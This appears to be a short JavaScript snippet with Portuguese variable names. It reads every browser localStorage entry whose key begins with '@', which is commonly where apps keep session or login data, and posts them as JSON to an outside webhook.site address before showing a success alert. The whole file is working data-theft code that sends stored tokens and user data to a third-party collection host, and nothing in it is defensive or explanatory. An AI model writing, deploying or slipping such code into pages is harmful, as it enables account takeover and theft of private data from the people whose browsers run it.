const webhookUrl = 'https://webhook.site/3c64fc72-13bf-4198-a997-21474987b631';

let dados = [];

for (let i = 0; i < localStorage.length; i++) {
  let chave = localStorage.key(i);
  if (chave.startsWith('@')) {
    let valor = localStorage.getItem(chave);
    dados.push({ chave, valor });
  }
}

fetch(webhookUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(dados)
})
.then(response => alert("O script foi executado com sucesso!"))
.then(result => console.log("Dados enviados com sucesso:", result))
.catch(error => console.error("Erro ao enviar os dados:", error));

export {};
